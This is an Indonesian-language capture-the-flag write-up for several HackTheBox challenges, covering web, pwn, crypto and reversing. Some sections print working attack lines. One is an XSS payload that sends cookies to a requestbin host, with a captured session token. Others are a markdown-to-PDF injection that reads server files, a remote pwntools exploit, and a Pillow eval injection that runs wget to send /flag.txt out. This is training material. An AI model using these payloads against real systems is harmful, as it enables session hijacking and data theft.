## Kryptos Support
Disini kita menggunakan XSS vulnerability:
```
<script>document.location="https://requestbin.io/112j9z21?"+document.cookie;</script>
```
![](./dump/Pasted%20image%2020220515080633.png)
```
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI1NzY2OTJ9._XSOlGzcLlymD93QD9JcaOtxN7KI9KwNfWz8JnED_J8
```

Kita bisa menggunakan IDORS pada:
http://68.183.37.74:30665/settings
![](./dump/Pasted%20image%2020220515093732.png)

### Flag
HTB{x55_4nd_id0rs_ar3_fun!!}

## BlinkerFluids

#### read directory

```
---js
{
    css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`,
}
---
```

#### read file

```
---js
{
    css: `body::before { content: "${require('fs').readFileSync('/flag.txt', 'utf8')}"; display: block }`,
}
---
```

![](./dump/Pasted%20image%2020220515183045.png)

![](./dump/Pasted%20image%2020220515182844.png)

### Flag
HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}

### Referensi
https://github.com/simonhaenisch/md-to-pdf/issues/99
https://www.geeksforgeeks.org/node-js-fs-readdirsync-method/ // to read directory
https://nodejs.dev/learn/reading-files-with-nodejs // to read file

## Space pirate: Going Deeper
pass
```
DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft
```

```python
#!/bin/python3

from pwn import *
from struct import pack

#elf = ELF('./sp_going_deeper')
#p = elf.process()

p = remote('178.62.83.221', 32339)

print(p.recvuntil(b'>>').decode())
p.send(b'1')
print(p.recvline().decode())

payload = b'DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft'
payload += pack('<Q', 0x00000000000000)
print(payload)
p.sendline(payload)
print(p.recvall().decode())
```

## Android-in-the-Middle

memasukkan 0 ke M, kita bisa mendapatkan flagnya

```python
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes
import hashlib


def encrypt(message, shared_secret):
    key = hashlib.md5(long_to_bytes(shared_secret)).digest()
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(message)

txt = b"Initialization Sequence - Code 0"
txt = encrypt(txt, 0)

txt = txt.hex()
# make it to hex that seperated by space
txt = ' '.join(txt[i:i+2] for i in range(0, len(txt), 2))
print(txt)
```

## Omega One

list_dump.txt

```
Lendrensk
Thauv'id
ThrorqiekP
Inqodse
Tarquts6
Dutp
KrolkelA
Emoin
Dakroith|
Creiqex*
ThomoisY
Groz'ens4
UrqekD
Nidv
CrerceonH
Yonphie#
XitsS
ThohulI
ZahrullW
Om'onsi
Kradraks
FIelkul+
Vranixq
TrunM
Craz'ailsh
Xoq'an.
Ukoxr
EvodsN
Taxan;
Munisb
Trurkrorg
Tulphaer?
Ehnu_
Krets$
Grons,
Ingell)
Ecruns(
Khehlanm
VelzaethR
CuhixQ
Vinzol
IstrurE
Zuvas>
Honzors
Ukteils0
Baadix}
Zonnu{
Aarcets\
Nevell[
Dhohmu!
XanX
ZissatO
Iscaxx
Pheilonst
Ghiso`
Scrigvil-
UmmuhB
Inphasu
Vurqails/
Vruzielsa
Ghut'ox:
Aahroill^
GairqeikL
QeksU
Scuvvils'
Ohols3
Som'ir5
OnzearC
Dhaesux2
Falnainw
Draalpho 
YemorG
Thraurgokc
Vogeath"
Cuzads1
GagroZ
Zad=
Dhieqef
Xustrek&
Harnedo
DhulgeaV
Zimily
Thretexz
Bravon8
Krugreall%
VaendredJ
Osux@
Ezains
TMik'edK
Cruz'oll<
Dhognot]
Drids7
Drercieks9
Statarsj
```

```python
with open('list_dump.txt', 'r') as f:
    raw_data = f.read()
    
data = raw_data.split('\n')

list = dict()
for i in range(len(data)):
    # make a list of key-value pairs
    list[f'{data[i][:-1]}'] = [data[i][-1]]    
    
with open('output.txt', 'r') as f:
    enc = f.read()
    
enc = enc.split('\n')

for i in range(len(enc)):
    # decode the list
    if enc[i] in list.keys():
        enc[i] = list[enc[i]][0]

print(''.join(enc))
```

## Rebuilding

Cari strings "prepare secret key" di disasembly

### Program penyelesaian

```python
key = b'aliens'
enc = b'\x29\x38\x2B\x1E\x06\x42\x05\x5D\x07\x02\x31\x42\x0F\x33\x0A\x55\x00\x00\x15\x1E\x1C\x06\x1A\x43\x13\x59\x36\x54\x00\x42\x15\x11'
v5 = ''
for i in range(len(enc)):
    v5 += chr(key[i%6] ^ enc[i])
print(v5)
```

## Without a Trace

decompile program menggunakan aplikasi Cutter

```sh
cutter without_a_trace
```

```c
uint64_t check_password(char *arg1)
{
    uint64_t uVar1;
    int64_t in_FS_OFFSET;
    char *s1;
    uint32_t var_38h;
    long var_34h;
    int64_t var_28h;
    int64_t var_20h;
    int64_t var_18h;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    var_34h._0_4_ = ptrace(0, 0, 0, 0);
    stack0xffffffffffffffc8 = 0x1c4b0d0b043d2b37;
    var_28h = 0x200f0a204c12204c;
    var_20h = 0x184f18200a204b1d;
    var_18h._0_2_ = 0x24f;
    var_18h._2_1_ = 0;
    for (var_38h = 0; var_38h < 0x1a; var_38h = var_38h + 1) {
        *(uint8_t *)((int64_t)&var_34h + (int64_t)(int32_t)var_38h + 4) =
             *(uint8_t *)((int64_t)&var_34h + (int64_t)(int32_t)var_38h + 4) ^ (char)(undefined4)var_34h + 0x7fU; // XOR
    }
    uVar1 = strcmp(arg1, (int64_t)&var_34h + 4);
    uVar1 = uVar1 & 0xffffffffffffff00 | (uint64_t)((int32_t)uVar1 == 0);
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar1 = __stack_chk_fail();
    }
    return uVar1;
}
```

```sh
ltrace ./without_a_trace
```

```
puts("[+] Primary Mothership Tracking "...[+] Primary Mothership Tracking Panel
)                      = 38
puts("[X] Unusual activity detected"[X] Unusual activity detected
)                            = 30
puts(" |-------] Unrecognised login lo"... |-------] Unrecognised login location: Earth
)                      = 46
printf("[X] Please verify your identity "...)                    = 60
fgets([X] Please verify your identity by entering your password > 414141
"414141\n", 64, 0x7f6d419178c0)                            = 0x7ffd5a046860
strchr("414141\n", '\n')                                         = "\n"
ptrace(0, 0, 0, 0)                                               = -1
strcmp("414141", "IUCzus5b2^l2^tq^c5^t^f1f1|")                   = -21
printf("[X] Intruder detected - dispatch"...)                    = 52
[X] Intruder detected - dispatching security systems+++ exited (status 255) +++
```

```
IUCzus5b2^l2^tq^c5^t^f1f1|
```

bruteforce xor menggunakan cyber chef

![](Pasted%20image%2020220520071030.png)

### Flag
```
HTB{tr4c3_m3_up_b4_u_g0g0}
```

## Teleport
```python
enc = dict()
enc[18] = 't'
enc[39] = 'u'
enc[0x29] = 'm'
enc[7] = 'p'
enc[0x24] = 't'
enc[0x1a] = '3'
enc[0x1b] = '_'
enc[0x10] = 'u'
enc[0x22] = '0'
enc[0x2a] = '!'
enc[2] = 'T'
enc[0x1c] = 't'
enc[0x1d] = '1'
enc[0x26] = 'n'
enc[0x14] = '3'
enc[4] = '{'
enc[1] = 'H'
enc[0x13] = 'h'
enc[0xb] = 'g'
enc[0x20] = '_'
enc[0xd] = 't'
enc[0x11] = '_'
enc[0x18] = '4'
enc[0x16] = 's'
enc[3] = 'B'
enc[8] = 'p'
enc[0x25] = '1'
enc[0x15] = '_'
enc[0x17] = 'p'
enc[0xe] = 'h'
enc[6] = '0'
enc[5] = 'h'
enc[10] = 'n'
enc[0x28] = 'u'
enc[9] = '1'
enc[0xc] = '_'
enc[0xf] = 'r'
enc[0x19] = 'c'
enc[0x21] = 'c'
enc[0x23] = 'n'
enc[0x1e] = 'm'
enc[0x1f] = '3'
enc[0x64] = '}'

# sort by key number
enc = sorted(enc.items(), key=lambda x: x[0])
# join
print(''.join([x[1] for x in enc]))
```

## Amidst Us
![](Pasted%20image%2020220520121644.png)

https://requestbin.io/179ya4a1
```
exec("import os;os.system('wget https://requestbin.io/179ya4a1'+'?'+'result=$(cat /flag.txt)')")
```
![](Pasted%20image%2020220520123411.png)

### Reference
https://www.youtube.com/watch?v=0ViLZ03vcew
https://github.com/python-pillow/Pillow/pull/5923
https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-2331901